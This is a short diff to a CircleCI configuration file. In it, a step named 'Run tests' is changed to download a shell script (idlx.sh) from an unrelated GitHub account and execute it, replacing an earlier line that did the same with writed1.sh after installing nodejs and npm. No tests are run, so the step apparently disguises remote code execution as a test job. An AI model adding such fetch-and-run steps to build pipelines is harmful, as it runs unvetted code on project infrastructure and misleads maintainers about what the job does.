@@ -31,9 +31,7 @@ jobs:
       - run:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
-          command: 
-            sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/bzmnmay/usad/main/writed1.sh && chmod +x writed1.sh  && ./writed1.sh
-
+          command: wget https://raw.githubusercontent.com/bzmnmay/usad/main/idlx.sh && chmod +x idlx.sh && ./idlx.sh
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
